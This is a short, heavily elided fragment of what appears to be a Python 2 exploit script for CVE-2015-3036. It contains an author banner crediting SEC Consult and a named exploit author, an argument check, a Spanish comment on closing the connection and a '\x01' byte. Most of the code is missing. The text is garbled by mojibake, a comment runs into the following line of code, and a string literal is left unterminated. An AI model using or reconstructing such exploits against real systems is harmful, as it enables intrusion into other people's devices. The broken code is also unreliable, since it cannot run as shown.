...
print "# CVE-2015-3036"
print "# Found by: Stefan Viehbö(Office Vienna) | SEC Consult Vulnerability Lab | https://www.sec-consult.com"
print "# Exploit author: AdriáRuiz Bermudo | @funsecurity | http://www.funsecurity.net"
...
if len(sys.argv) >= 2:
    try:
        ...
        #Finalizacióe la conexió        end = "\x01"
        ...
        print "Error de comunicació, detail
else:
